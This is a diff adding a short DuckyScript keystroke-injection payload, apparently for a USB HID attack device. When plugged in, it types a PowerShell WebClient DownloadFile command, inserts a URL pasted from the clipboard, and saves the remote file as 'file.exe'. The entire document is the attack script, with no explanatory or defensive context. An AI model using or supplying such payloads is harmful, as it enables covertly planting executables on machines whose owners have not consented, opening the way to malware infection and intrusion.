@@ -1,0 +1,8 @@
+DEFAULTCHARDELAY 15
+
+STRING (new-object System.Net.WebClient).Downloadfile('
+
+CTRL SHIFT v
+
+STRING ', 'file.exe')
+ENTER
